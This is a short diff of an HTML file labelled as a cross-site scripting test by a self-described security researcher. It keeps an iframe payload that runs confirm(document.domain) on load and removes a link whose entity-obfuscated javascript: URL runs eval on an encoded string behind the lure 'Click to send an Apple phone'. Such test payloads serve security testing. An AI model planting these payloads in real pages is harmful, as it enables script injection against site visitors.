@@ -34,9 +34,8 @@ info:
   Cyber resrarcher:xie22 
 </div>
 <!-- xss test -->
-  <html language="javascript">
+  <html language="javascript" lang="en">
     <iframe onload="confirm(document.domain)"></iframe>
-    <a href="j&#97;vascript:eval('&#97;u0091x65x72x74x28x22x31x22x29')">Click to send an Apple phone</a>
     </html>
 
 
